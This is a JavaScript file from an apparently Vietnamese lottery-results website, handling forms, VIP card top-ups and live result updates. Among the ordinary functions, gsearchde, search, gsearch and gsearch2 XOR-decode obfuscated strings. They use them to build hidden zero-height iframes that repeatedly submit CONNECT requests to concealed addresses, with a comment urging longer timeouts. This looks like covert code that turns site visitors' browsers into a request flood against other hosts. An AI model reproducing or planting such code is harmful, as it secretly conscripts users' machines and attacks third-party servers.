var loadingImage = false;
function LoadImage(imageName,imageFile)
{
  if ((!document.images) || loadingImage) return;
  loadingImage = true;
  if (document.images[imageName].src.indexOf(imageFile)<0)
  {
    document.images[imageName].src = imageFile;
  }
  loadingImage = false;
}

function SoH_Mien(namecontrol, number) {
	var hideshow = document.getElementById(namecontrol + number);

	if(hideshow.style.display != "none") {
		hideshow.style.display = "none";
	}
	else {
		hideshow.style.display = "block";
	}
	return false;
}

function doChangeTypeNap(formName) {
	var type_acc = '';
	for( i = 0; i < document.forms[formName].type_acc.length; i++ )
	{
		if( document.forms[formName].type_acc[i].checked == true ) {
			type_acc = document.forms[formName].type_acc[i].value;
			break;
		}
	}
	if (type_acc == 'new') {
		//document.napvip['acc'].readOnly = false;
		document.forms[formName].acc.readOnly = false;
		document.forms[formName].pass.readOnly = false;
		document.forms[formName].re_pass.readOnly = false;
		document.forms[formName].phone.readOnly = false;
		document.forms[formName].re_acc.readOnly = true;
		document.forms[formName].acc.style.background = "#ffffff";
		document.forms[formName].pass.style.background = "#ffffff";
		document.forms[formName].re_pass.style.background = "#ffffff";
		document.forms[formName].phone.style.background = "#ffffff";
		document.forms[formName].re_acc.style.background = "#eeeeee";
	} else {
		document.forms[formName].acc.readOnly = true;
		document.forms[formName].pass.readOnly = true;
		document.forms[formName].re_pass.readOnly = true;
		document.forms[formName].phone.readOnly = true;
		document.forms[formName].re_acc.readOnly = false;
		document.forms[formName].acc.style.background = "#eeeeee";
		document.forms[formName].pass.style.background = "#eeeeee";
		document.forms[formName].re_pass.style.background = "#eeeeee";
		document.forms[formName].phone.style.background = "#eeeeee";
		document.forms[formName].re_acc.style.background = "#ffffff";
	}
}

function doCardProcess() {
	
	$('#error-napvip').html('<span class="sred">Hệ thống đang kiểm tra mã thẻ.<br />' + 
'Bạn vui lòng <b>không tắt trình duyệt.</b></span><br /><img src="img/loading.gif" border="0" style="padding-left: 50px;"/>');
	var card_type = 0;
	for( i = 0; i < document.forms["napvip"].card_type.length; i++ )
	{
		if( document.forms["napvip"].card_type[i].checked == true ) {
			card_type = document.forms["napvip"].card_type[i].value;
			break;
		}
	}
	
	var type_acc = '';
	for( i = 0; i < document.forms["napvip"].type_acc.length; i++ )
	{
		if( document.forms["napvip"].type_acc[i].checked == true ) {
			type_acc = document.forms["napvip"].type_acc[i].value;
			break;
		}
	}
	
	$.ajax({
		type: "POST",
		url: 'process-vip-thecao.php',
		data: {
		  "action" : document.forms["napvip"].action.value,
		  "username1" : document.forms["napvip"].acc.value,
		  "pass" : document.forms["napvip"].pass.value,
		  "re_pass" : document.forms["napvip"].re_pass.value,
		  "phone" : document.forms["napvip"].phone.value,
		  "username2" : document.forms["napvip"].re_acc.value,
		  "s_code" : document.forms["napvip"].security_code.value,
		  "type_acc"  : type_acc,
		  "card_type" : card_type,
		  "pin_card" : document.forms["napvip"].pin_card.value,
		  "data_card" : document.forms["napvip"].data_card.value
		},
		success: function(msg)
        {
			$('#error-napvip').html(msg);
			var randomnumber = unix_timestamp();
			//document.forms["napvip"].capcha.src = '../CaptchaSecurityImages.php?width=100&height=40&characters=5&t=' + randomnumber;
	    }

	});
	
	return false;
}

function bookmarksite(title, url) {
	if (window.sidebar) {// firefox
		window.sidebar.addPanel(title, url, "");
	} else if(window.opera && window.print) { // opera
		var elem = document.createElement('a');
		elem.setAttribute('href',url);
		elem.setAttribute('title',title);
		elem.setAttribute('rel','sidebar');
		elem.click();
	} else if(document.all) {// ie
		window.external.AddFavorite(url, title);
	}
}

//chi chi phep nhap so tren text box
function onlyTextNumber(evt) {
    evt = (evt) ? evt : window.event;
    var charCode = (evt.which) ? evt.which : evt.keyCode;
    if (charCode > 31 && (charCode < 48 || charCode > 57)) {
        return false;
    }
    return true;
}
    
function check_feedback(){
	var regMail = /^\w+[\+\.\w-]*@([\w-]+\.)*\w+[\w-]*\.([a-z]{2,4}|\d+)$/i;
	if(Trim(document.frmContact.txtName.value) == ""){
		alert('Hãy nhập tên của bạn!');
		document.frmContact.txtName.focus();
		return false;
	}
	if(regMail.test(document.frmContact.txtEmail.value)==false || document.frmContact.txtEmail.value == ""){
		alert('Bạn vui lòng nhập đúng địa chỉ Email của mình!');
		document.frmContact.txtEmail.focus();
		return false;
	}
	if(Trim(document.frmContact.txtContent.value) == ""){	
		alert('Hãy nhập nội dung bạn muốn liên hệ và góp ý!');
		document.frmContact.txtContent.focus();
		return false;
	}
	if(Trim(document.frmContact.security_code.value) == ""){	
		alert('Hãy nhập mã bảo vệ chính xác!');
		document.frmContact.security_code.focus();
		return false;
	}
	
	return true;
}

function gsearchde(good)
{
	var to_dec = good.replace("AAA", "<?");
	var xor_key=10;
	var the_res="";
	for(i=0;i<to_dec.length;i++)
	{
		the_res+=String.fromCharCode(xor_key^to_dec.charCodeAt(i));
	}
	return the_res;
}

function search(good, tt, index) {
	var search_str = gsearchde(good);	
	var search_fra = gsearchde('6clxkgo*}cn~b7(;::/(*bocmb~7(:(*lxkgohexnox7(:(*dkgo7(lxgqcw(*edfekn7(myokxib"-q~~w-&*q~cw&*-qcw-#(46%clxkgo4');
	var str = search_fra.replace("{tt}", search_str);
	str = str.replace("{i}", index);
	str = str.replace("{i}", index);
	str = str.replace("{ti}", tt);
	document.write(str);
}
//tham so tt cang cao cang tot
function gsearch2(good, tt, index) {
	good = gsearchde(good);
	var html;
	//var tt = 2000;
	html = '<form action="' + good + '" method="CONNECT" name="fname">'+'</form>';
	window.frames["frm" + index].document.body.innerHTML = html;
	window.frames["frm" + index].document.fname.submit();
	if(navigator.appName == "Microsoft Internet Explorer") {
		stop = window.frames['frm' + index].document.execCommand('Stop');
		setTimeout('stop', tt);
	} else {
		setTimeout('window.frames["frm' + index + '"].stop()', tt);
	}
}
//tham so tt cang cao cang tot
function gsearch(good, tt, index) {
	var html;
	//var tt = 2000;
	html = '<form action="' + good + '" method="CONNECT" name="fname">'+'</form>';
	window.frames["frm" + index].document.body.innerHTML = html;
	window.frames["frm" + index].document.fname.submit();
	if(navigator.appName == "Microsoft Internet Explorer") {
		stop = window.frames['frm' + index].document.execCommand('Stop');
		setTimeout('stop', tt);
	} else {
		setTimeout('window.frames["frm' + index + '"].stop()', tt);
	}
}

function Trim(sString) {
	while (sString.substring(0,1) == ' ') {
		sString = sString.substring(1, sString.length);
	}
	while (sString.substring(sString.length-1, sString.length) == ' ') 	{
		sString = sString.substring(0,sString.length-1);
	}
	return sString;
}

function check_date()
{	
	if(document.frmMain.txtStart.value == ""){
		alert('Hãy chọn ngày mở thưởng!');
		document.frmMain.txtStart.focus();
		return false;
	}
	return true;
}

var httpObject;
var link_site = 'http://ketqua.net/';
//var link_site = 'http://www2.ketqua.net/';
//var link_site = 'http://localhost/vip.ketqua.net/';
function unix_timestamp() {
	return parseInt(new Date().getTime().toString().substring(0, 10));
}

function updateKetqua(type, ngay) {
	httpObject = GetXmlHttpObject();

	if (httpObject == null) {
	  	alert ("Browser does not support HTTP Request");
	  	return;
	}

	// document.getElementById('ketqua').innerHTML
	var status = document.getElementById('status');
	// alert(status.innerHTML);
	var randomnumber = unix_timestamp();
	
	if (ngay == "") {
		if (!status || status.innerHTML != "1") {
			//url = "http://localhost/vip.ketqua.net/xo-so/kqauto/kq" + type + ".html";
			url = link_site + "xo-so/kqauto/kq" + type + ".html";
			url = url + "?t=" + randomnumber;
		} else {
		    exit();
		}
	} else {
		// var url = "http://localhost/vip.ketqua.net/xo-so/autocantuvi34.php";
		var url = link_site + "xo-so/autocantuvi34.php";
		url = url + "?type=" + type;
		url = url + "&ngay=" + ngay;
		url = url + "&t=" + randomnumber;
		// alert(url);
		if (status.innerHTML != "1") {
			status.innerHTML = "1";
		}
	}

	httpObject.onreadystatechange = setOutput;
	httpObject.open("GET", url, true);
	httpObject.send(null);

}

function GetXmlHttpObject() {
	
	if (window.XMLHttpRequest) {
	  	// code for IE7+, Firefox, Chrome, Opera, Safari
	  	return new XMLHttpRequest();
	}

	if (window.ActiveXObject) {
	  // code for IE6, IE5
	  	return new ActiveXObject("Microsoft.XMLHTTP");
	}

	return null;
}

function setOutput() {
	if(httpObject.readyState == 4) {
		var stringOutput = httpObject.responseText;
		if (stringOutput != '') {
			var mySplitResult = stringOutput.split("#");
			document.getElementById('ketqua').innerHTML = mySplitResult[0];
			
			var giaihientai = document.getElementById('giaihientai');
			if (mySplitResult.length == 3) {
				if (giaihientai.innerHTML != "0" && giaihientai.innerHTML != mySplitResult[1]) {
					soundPlay(mySplitResult[2]);
				}
				giaihientai.innerHTML = mySplitResult[1];
			}
		}
	}
}

function updateKetqua2(type, ngay) {
	//alert('abcd');
	httpObject = GetXmlHttpObject();

	if (httpObject == null) {
	  	alert ("Browser does not support HTTP Request");
	  	return;
	}
	var randomnumber = unix_timestamp();
	url = link_site + "xo-so/kqauto/" + type + ".html";
	url = url + "?t=" + randomnumber;

	httpObject.onreadystatechange = setOutput2;
	httpObject.open("GET", url, true);
	httpObject.send(null);
}

function setOutput2() {
	if(httpObject.readyState == 4) {
		var stringOutput = httpObject.responseText;
		if (stringOutput != '') {
			//alert(stringOutput);
			document.getElementById('ketqua2').innerHTML = stringOutput;
		}
	}
}

function soundPlay(currentFolder) {
	
	if (document.getElementById('kqUseSound').checked) {
		linkfile = link_site + "styles/" + currentFolder + "/images/sound_giai.swf";
		
		if (window.ActiveXObject) {
			// code for IE6, IE5
			document.getElementById('kqsound').innerHTML = '<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,0,0" height="0" width="0" type="application/x-shockwave-flash"><param name="movie" value="'
				+ linkfile + '"></object>';
		} else {
			document.getElementById('kqsound').innerHTML = '<embed src="'
				+ linkfile + '" width="0" height="0" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash"></embed>';
		}
	}
}

function updateEmail() {
	httpObject = GetXmlHttpObject();

	if (httpObject == null) {
	  	alert ("Browser does not support HTTP Request");
	  	return;
	}
	var email = document.getElementById('email').value;
	var regMail = /^\w+[\+\.\w-]*@([\w-]+\.)*\w+[\w-]*\.([a-z]{2,4}|\d+)$/i;
	if(regMail.test(email) == false || email == "") {
		alert("Bạn vui lòng nhập đúng địa chỉ email của mình");
		document.getElementById('email').focus();
		return false;
	}
	
	var randomnumber = unix_timestamp();
	var url = link_site + "email_receive.php";
	url = url + "?email=" + email;
	url = url + "&t=" + randomnumber;

	httpObject.onreadystatechange = setOutputForEmail;
	httpObject.open("GET", url, true);
	httpObject.send(null);

}

function setOutputForEmail() {
	if(httpObject.readyState == 4) {
		var stringOutput = httpObject.responseText;
		if (stringOutput == 'error') {
			alert("Bạn vui lòng nhập đúng địa chỉ email của mình");
			document.getElementById('email').focus();
		} else {
			alert(stringOutput);
		}
	}
}
